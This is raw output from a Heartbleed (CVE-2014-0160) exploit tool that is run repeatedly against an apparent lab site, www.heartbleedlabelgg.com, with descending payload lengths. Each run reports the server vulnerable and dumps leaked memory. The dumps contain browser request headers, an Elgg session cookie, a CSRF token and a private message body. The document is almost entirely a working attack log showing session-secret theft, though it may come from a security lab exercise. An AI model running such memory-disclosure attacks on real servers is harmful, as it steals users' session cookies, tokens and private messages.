##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........3....**...c.....2.?G
]8gD....e....H,
...6..BM*...9 L.7$..4.ychAq..'...g......%b........?..,....gG..Yi..).w.....~.L.........7%.R....8dH. .v..%...;j.z....)..KQF.Z.".s.{`.gAs.vr..a.H;.G[..S......(O"i..v.)....x.c..Y..W.x.#.......~2d...m..V..**.tR"..eeed..6...p.).9uZ.h..&....J..w(;.D..r...'4....]........q.d*{...BQY.f.5}y...e..UI+..G...Hx..1.e5.+.b
..&
..
.v........#~...V......&.}...UG'0...R...i..=Z.......p%.)lS..m.I.P....h..O..6B.Q.6.....T..&...Z.J....TR@...H...#..i%.|..D-..q......A..*...3Q
....".{..XQ[..D...![.r.V....Ovg.......L....#..Q..?......H..8*HU.......\.1.......A.....E.....U.5~.K..[..9.B......Wv<...4..b.f(.a.......,.g.Q;d"U..H)a.>...U..d5..9..Gr.r
:_D[.7.&.....!...S$.T.q......8h&l9F..].r%.q{W.#..r.2w....a..+>H.0.y?s..1K+Vt....I@F.l..V.....Ka...w..W..T.4S%.Z...{.a...ul..!Js..H)_...eJ.......`l.;%'D...r.......5W..@.P....
.U.|..9..p............d...Q%4Vt4.{n....[z.0-s....7Q...UzP.;.
#/x
...=3.JF..D..5.y.M5j...A.{c.,0.".5k.\$....!.;...}.8H....f.v.m.W........~1.|.J.0.?...o.T.z#I..B&(.h..8j.F.`.e#j7v.C+\......._.~W....._.Z..^@.(H._Ui...1.@\.....m.....~.xH.9.k......@..&r.x.....4....yFs-....H.c.3.K..=..FN.......=k.|.H]..z.(......'.P$...j.......E..0...A.R.b
.{..t..@..z@sCQf...2<..B.a.....6.>....._../.]..o..l|.WB..|O.AQ... ..p..i.@..t.....r.=.\...M.x(.RLj.......Di.....h2.......h2.http/1.1..........#....4....Dh.B......&.E2.@....X....-H.HM.[..3u"L.\x\.M.....!|s...y'p.+..}.q,y...({.%,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`.
......... ..pC....t..X.....>.............c.......N.{.(C.........Q.|...:<...G.w.;.0@y.....l.MN..C\!%..r..6F.*0.....".....C9.j.
..S.......Z.....+.E.f..il.]3.E.\"!1.^.B..^9..
.x..f.t.?....F)S/.O..w.jq.CV....j...sR.7........zz.........
..................................h2.http/1.18..K...)~.h'W9..

Completed attack with length 5000.
Running attack with length 4500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......e Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

.\]..*.......o..flate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

x.y..nj...;....zkm1n9o8vokge0

..-..:.........'.36Z...:...g..p....KIgz....9...PNs...5.. l1.Q...6CA3....G......O*P[X.W.......L...nA.....3l.lJfwc...Xz..<.Q.4.."/.D..L.Y+..:.....s.@.3...;...(.f.v..D`.!...Uz..Ik..|rf.\s.s4....Y9.jZh.M...r e..I.x......%j...&..l[zJtK.,.h....I...#^|4..f....[..............k#2'L....WTM.SQ...v../..v.zV.+......<|..c........U7..%..TP........!.O..a
...QR,.BT@J.Z.p.=.(.z.+
..iu..qwP...)1.#.8.Sh..3.>k.G....|..$~o....a.a.UB<..,....._..IsZ..x.y...q5S.|..8*y..0.ZW..u.........=.@I*![.@
.).c....tp7EAP...Pe%....Fb!.+.^A....|Qg~
.?...J....B..{....w:F>;.;..CLW..i\.pVbKG. |i.>|9g....B.oK..I4=.....b...#......m....l.A.5B.R..#?
@.j...D..._......._...5fU-w\..~..>....x~v.w5.U,.f.aXt..L..NC,..<..L.h.....3...9.p9 ..~)q......vb}.WZ..A.Z(.t.,._I.Z...!..(.(.)}A....ff....$..ESa.....;'...OB.z:k"..vU.,iM.a=ey+.r......V....(P........oj:......#....X....g.6.D...Fp....#X.j,uhN.^.X=..10.O.!.Ec2O.k..~.e.YG......t...(.P.?..t.....j/.v]..DrX... ..99......
...<.{.F.k..+d&aY...u......#........2..1..9....Y!..(U.7V...i2..gU/&<.K[.~.........]DB.....9#/9[$/8.B.
...^%!..1.......]>..q9j.lv..Ah....!l.$.....N........Wu0.4.`.-..)fp.xS...n...X....4Lq.O...x
.%..:..4....2.......[\A.[.
...................Di.....h2.-..........
..c........-....Di.....h2

...............
...
..c.......

'.D..?qW........

Completed attack with length 4500.
Running attack with length 4000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......ke Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.heartbleedlabelgg.com/activity
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

,.DC...HA.W_V...
.r.....E...O;Pq.......f~[.F...<..S(}.....I....)...W..i..ra....X..y...[..~..8.i.d~..G2..
K.6$&.......,xdU.d..H..+:.y..&..
.;.v...-@.M...8.....v....oY1......}.....7..[..\.A.JG$.....9.....V.$..LF.RRN.....4...*g.<V....9..6i.e*.gm..g...../....#.o..{.,.wp51k.R.hc.......8bc0U.5&.b;.....+>.b....Y..Yk=k....
...
.@.JM.b.!w+"4#ij....R5.>3y..}...i...,3.D.....g.XW*R|..!....7.9.W.!..9......2.....(......-.v....]e...vmqS..'p..".ro.......h..p.P c....c..2.k?....r.*....fU..|.v*..........W?..
V......rG..le73../V..|^>.h[.....;..1s}..N-.sA,F........@..E.G.y...1xX.'....h..x...*......m3.....Q}.P7........s~.CZT..3k....0f6.b.p..+{.....d6..g..,...a.{.c?...
.]z......N...=....h.i.;...B.X.:..[...`..B.]..e..Lz..Jz".....8.,.<...R&".
..G.q.9$...LpZ...r.g..j....}.9..ov...I...[..x..oF...D...+eak......Z.1>&....\..X...qd...2.!.)|...h.e..i........+*.y......Gr..Y~.....VS.w.3.{z....6.....k.!...UJTk....
.T...n...Y.....d<E.(..'E.7...-LY...V.s|\.L..0.(....0b.x.|v...v.A..t.......d....Z...-`.......... .7...h....r.H..-.......).=.._Y.......
.....................
.......r. u.N....Q.&....b..r.~..x.=.~.k".....c_.pP.q^......0......:5u.!.~"AD37...@9....7..*....*..*.....w..0q.....+.>....O....0..Bo.0@5..-p.']..
.....c..3..lZ.ms...$.x5.KCFn.R.....m?\...A&...............www.heartbleedlabelgg.com.-..................Mx.H...9.X.u....Di.....h2........f*.?u.u./S.O@... .
Fs.EJ..it.XG........$6..=8.aj9d_..f..Y..

Completed attack with length 4000.
Running attack with length 3500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

.
.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#..........g....x&6!.....p<...f.D._.Y(....1._..9...48.....9Fvw........,..!4..&1/R/..HA.l..1..8.O..M\C. tu...)..h....>...-..J.:\|....j...WC.....D..........a.....
...
zzc.................
....................Di.....h2.+...JJ.............www.heartbleedlabelgg.com.......h2.http/1.1.-....................3....zz...c.........6....I...)J.gu.a]..,p.~..a{....9pu....."[1..g5E.eg.....6b..........Y..,).:i..u.....X..n.q8...k..&..Er...]iIJ...$
b.i...=..9)5....Ybw{.w.\..B..2..}...(......p...
ii...$.B..C;...O.pB.TX.F.....b...>.l.\c.2@...?.<....._..N.......J...GS..L'*...8.?.....Uv4...y.
._w..Sz.0......(.vU
....].#...V9.;....Gt...t|........x:k....
.]..R_..E.U.AT."..P.....1...to......$x.s......e.q..a.1x.X.
 .
..4...P.q8dgY..1...
'..Zwx....
...f..F.X...\...Q..7...7..!B&..c..J.._tT..Jo...e.@.7$.Ls....b.d..#...'.56..<.3l.H..qS..)3........lw.z....s.........rt.E..1.A7s.Z,.0..}...K
.I.5
..>....V.<I......O....Z.w"...........[..o......pl...P~XN.p.Q(...dP.t.I).3.d."^.......r..t..I<.'.G.....b#Ks}5.c...y.....k.c.3=V\.Q...|c.8.....`D$..E...._.U....
p1`...K@.q...7(.....E.FA............Z...g...%'DT....K0{>{kD/\...9]+k.........."5..-0....?.2.Vt.K.._.Cll_.W.....|..`..W).1....T......9..q....ZbA*U..!}$.k1.*..P.VM"k'...c.t...a...A.....5.D.G........\h,m..%.@W.Q..S..'sR3d.Q..p....!G....4.j.Y)..:T......S...q....L.x..#p...L.fH....'6f.s..V...X{.i.qZv...V.....#. .#u ..heJ....$P.....E..1...1sS.6..j....,&v.ky].3C...+|...
....4...I..o.D..fI0.=u.).6....(..Q...G.8GP;;.r..BG.4c,.*pr)..$8.Y.........cW....DF./......R.huaW..
s.,.+...b."..T#......|..+....q..... Y..X..P..?.
.SRx'...........h.B.........#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%........
F.j...JH.'..

Completed attack with length 3500.
Running attack with length 3000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#...........
.......{. t.(._..,.....D(9.%...6..5....$
.......
NE....-..O6....yP..Z..nn".r.....wwu.....5.V.A.......<..........)..B.N9.. .nk..FL..IJ.,85.!
..g.S...H....?qB..*N.M...i.c..U.....Mn..!...........Di.....h2......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V...Z..>....STD'.0%....3.........c...S...r..u.:.W..A9.;7...zdQ.....3u.7(..Aw.......K.....Rt.NF.........:t....V.2.....aw.d .dq!..kLDL..hF..L...W.E....
.d7t..iER.w.).`)*...{..=.Y.ul.....(n[..j.`..=.',.$_......}...6HD..{.`...:a.J.yL.u.....f8s...>.Q......[.:.."x.L....|....W..UA6F`.....o......C.D.Z3..{;b@.4.He.z.[:.U....=..j$.._S?@.?P...QJ..F..0).=.i.l:....@..v....*j..>....9.Vd<....+..+8.4jZ..0..q.f\`a.......O.a.l..\...Q..!s..j....r5..p+Z%..g..Y..S.2..G...@...2..`...wG.\v..}...VdV...~.w(v.@VXJ"...s..~y.-a.C.Z....+\(..=.Qj.T.$.E.[O.K].a`.P.{.Xg...y2.&.XdN|.).rq.."[.L.5.......{(..Ej{.>t.4..eO6.*.X.<..Z...3k3C..#..\k....(.)W...$...@M..A.6.Tea..U.....<#,J..(..2*#..LN......u....
.1=.....&M..).{..>...g...Zw.r..a&^$.tT.....'..ZV..A@.s..8..|....,..C.$.?8.,..C..R.......X1V...........w.J.q.?..)..b.7.b.DK7...M$.....L.<.I..X....g.6.]...}9.P;>.1
.
......l. .Q.:..5P.%.2a.as;D-...i,2.....M.; ?H..P1.w..l<bA...n.u.O..4#....V...e.nAyJ.Vj..........aQ`...er..Y..*..T...a
..~....C.5.q.<...9.......s
..G.P%.V.z1.u.`...h.Z.y..VU.Tn..K..l),.D;*.s..`kT..u.r=.*H....s-S..$.C....W..>.c~W...U..C..!...... .bi....i.F .......Dt'|.z.c..xk..()...0.}l.u;gAHp.Y....|T.?; Of)l...z..e....
."...C......W...s......#j.:lD..-.@f.V`..?.D/E.s...+....>.L...;...E.F.U
a.}.h...m....*.,@m.F... ..".A......u......85.1......6.=6.
...
..c....................b...V...Z..>....STD'.0%.........G.......&.-.....+...............
::c........+w.e... .b_..%..

Completed attack with length 3000.
Running attack with length 2500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://www.heartbleedlabelgg.com/messages/add/33
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

\...D.......F...p, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=7olmbqsb40ij2km1n9o8vokge0

__elgg_token=a017028027520a9547a440da6a60c56b&__elgg_ts=1729485922&recipient_guid=40&subject=Another+secrets%21&body=Yes%2C+very+secret+indeed%21.t.0?..n..j...K...T+.|..q..K4<....Z.5.RehF..X).f?w.c>{[P`....I0..5..)U...N.%>..v..EY.[.Z.;..b.b.F]...Y..6...W.a.......u.=..T.|Gd.]t..+..-..v..:..Hq....1.s......
*/..~.s.Q.lU%...V......
..&....pFYL y.4.-..Z.....s-#.-TYWyX:....2..o4.K.JT..Ea!.'...wr..?....R'......R 6M...s.
.e.L<.....>.9.u..e....uuX..Y'..{.J.?.9u...,P..l....@l.B.8...8A..tY4\..Z...zz.BGWX...,..;m...o.......q..2>k;Q.........C.........D.:=..I..mi..L./a.X....k(.P..4P:..,.~>....K..70...._..E. <.Q].g..r.:a....c.@4./..K...5...+
..x..}X3..........z.JA..>......._E....(,..>f..*O+.A9.q.".|./.....C..F2.
S$QPY.........
a5-[.RW.U,..M.N..zu........e.
C'..u......L....73.3.6"$.G....0..../...grvD.u.Y..yS.!C..].ly.U..Y.V..\.].|fS..6...QG...X....|2;0..].|1..n4..FJ.....Gy
.2.......&..X.m.b8.....3..Yv.{5.|CC.&..tW.KO{|.\\.h....Z[M..W..........w...
.._x.q... ....z..."...e.....3......S.T\&.w........+.........Di.....h2.........www.heartbleedlabelgg.com.......h2.http/1.1**....Di.....h2.........www.heartbleedlabelgg.com.+.............ZZl.....$.W..P.d.

Completed attack with length 2500.
Running attack with length 2000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.........M..
.$h....MW..Y?.Yq....../..I'.....]h...hf.QT.c...*....%....4&0.....j4.._.c..+.....%......]..W.m_y..$.56.e.....|X.......f.2.eN3.D;.z;....f......).l..:......;....aLd....v%IX.nD.).p:..:.8F..'c.(.....P
S....*w...^.I....c... r...O..v?.N........
...........................h2.http/1.1.....
...
..c........3.........c.....#....,....!......e..&..hv....,....(.fkHV....R...v.6.3C7...a.Y\..&h.....7gC..R..U...q.TW.A.A.U.......5.d8vYKxQ.....
....
a<_...XX.e.2y0]s|......A.5........`([..".[..*.....?.[.....tz..E@(i....3#~.R....'U..>x.<j'E.g..2o.....3~k.%.;..;.2.'.eC....a.xj
...bU...y.#....+MG..k0u........
...........+E.....yl-_.j....3..g| .....=..:.(....!.'Zz...>.a4.@$R.fz\..(..?.'..|..a.......w....x.k...<B..<k...
......x..... .S..e..k....K~...4E.3T.N.S.:5e$.*e.
e..+...Q...i..i....[,..Ek...6nR)Fz{-..G...X..s<....S.B|..Kw.bp
.;.xBJ.z..J.Yh.....hE.k.B5.....MNf..Q2.AR}..=u...d.rZS.u..5L.h.H..w..i..US.....R.......ZN..]........69@.a..#.[#..H.H.P66.f...J...R....>8.!..P,-......7..C...19h..l..9.e.:..R...k.4l[.N...(.6.|..h....,T..S.:...p..P._."..*.fs[2..i+T.b...Bdc....A....Au.G..{{4.a..f6Rx.@g.......?....\.zz..]_a......N.....l>.......BV.......j.Z.....`rn.H.\5..Z07....%D.TZo?.j"A..0..p.be ..............&...pj.~qP.ga.R...D..H]z...ZM&..._....k|....<<.u.QS..DEg...g...K...r.g..............X.......BH.......C..*...#ST.......o:..eW..KM.3..F.42.$...Xuc.x.A+.:......o'.2gL.u.....J..j}bP.+...Vs.k...Tzj...Qh.H..0.9)..6...=k.......Q.c.2.r.J.J...#n....A....8.u.Y.h..+....f.0k..=....>..1
c.].N..-.0...
2..]...`.k.%...xT......&.....@...8Z...'.R......... ......fi...&n...2.........>..z.R......#....4....Dh.B.............(.f.,9...a,....p=fD~.O..
=.....m.J...A...(...P....{`
9y.X4.......$.........A....
........W..K.I....3..:....5.FN.:..{..y..........!.N.n..pD...k.Y......a..n.}z.Ff%.xbz.. e.....b...V....y....N....t)._

Completed attack with length 2000.
Running attack with length 1500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......x#."..8......H6..'....v...,.....\~..O.x..?.....c}.i.*...#=.....H..|t.U..
..k...z..k9.QZ.....hr.
."..
R.......b.0...K3)...|....G..q......JE]).p8........9L2?....................www.heartbleedlabelgg.com.......h2.http/1.1........
....................Di.....h2.+...

..............-.....
...
..c........3.........c.......S....yH....vw.|.....r....&CN..K....E3.EB*.N...".o.Y.A."..i.....$.L..w...KN#.{...C.Y.|.5vae
)Wfir.RK........#.h!.Ze...xgF;.AO;..}.....L........;...3...5.ht.&_?.PEi%..% .P.{....H(.S.....$c.0\C#....<.....@..F.r^...'I...759.
.VD..e.l.pv.A...m"'.$l.dsFz3MZ4.....5 ...\.yG....i|w6A...xl...r.>.......i..J6..a]...y|m....;.I9..'%. 8..<z..Q....r.2..(...<.w.......I^O.0.E...N..~.Q!...h....g......&.z....X2.a.?..,....>6...&Ac....r.!..K..6...=.C....k...e......4..zpI~..d..@..#2@..c...U.1..5..5-.$....xp[..Z..\.)<.i....:!.O...TI.8pa,N..........kZW9[E
....YXC.{..._.......KnOS.5..r@YM..U1.k.....Y:..D..Q4....B..'.I.gI!.....Q...........`.o..=.O..#W.. .......yTh#..2...G...j4f.r.J.n.n).!...S..>\...W.wv..m..._....3i..v.j..0..qz |..[.`.wQ...o..<.dl`H.....5..B+2g..9...V{..d.6..zB.:qU;r:..I4C.S.......$....90.K"R
..Qi.w0A......r.}i.v..0R.qG...........#6. rk...Ue......N.Ua.+.F........b..L.7g.l..T....yD,.`.I.D.)x#..i^9.]?..5.......cUtj9D^..j....W. ..'.HA.TSt...1H.M.....mU.[...Ze'O'...y...s..X4]$d^...

Completed attack with length 1500.
Running attack with length 1000...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#.......,C.......p6J...l.s([........+Q......m...FSG..P5...z.6..,.gW....q..(*}.F..b..?.V..YHw..O...p......-._?r.C..................l........dA.q.QII.s.`........
...
::c........3....::...c....fc...mI.^...b.7{xY6.N......=.....t.......Ey....t...d...D..............'.TY.A..*..f5.'..;...[...$...........aa..4..Ns....:z...L:.0g..AU!....m...gm..R..B. .d......xx.....rk...v..5
`..+F.g.[..g.._.)&E...(2.'r(Y...\T..oY......P.%c2<.a....g........
..]..x..k...T.i4..K.4 D.$.,.q..y....bF=........{&.....A..(#}.W_z.8x*j.f./L.....6V.....\..P...e...;..5....)..,f..C.g(.2Z......w.#.....d.,..-.0y{-..].@...ZD.n...fi.n2...)D..e....J.....D*.S...nZ..Y<..!."f..I..t.u8........\FY.../z.bY........O.-5.W..........6%,w.V.ai.#]w...+s\p.......U.a...U.7J\9.........xS..m$)l...l.......n.('.:"nI....&6..<WxB~.2D.......1.#.\.Y..C4.b..$~s .!

Completed attack with length 1000.
Running attack with length 500...

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

Please wait... connection attempt 1 of 1
##################################################################

...AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
.".!.9.8.........5...............
...
.........3.2.....E.D...../...A.................................I.........
.4.2...
...........
...................................#............B...{{.g4v..r.%[..*n..i..L..s`......B*...s..2..3.e..M #vo..}+U........C>Td....c...i....,..M!;Y.m.(....]..\..x..b.A.Hw....X..WK..<9.D..v.'=7.:.\.Bv.h...........h2.http/1.1.................
...
zzc................www.heartbleedlabelgg.com.3....zz...c.....<.
F......."..._....9.Y ....o...cW...p}..

Completed attack with length 500.
Heartbleed attack loop finished.
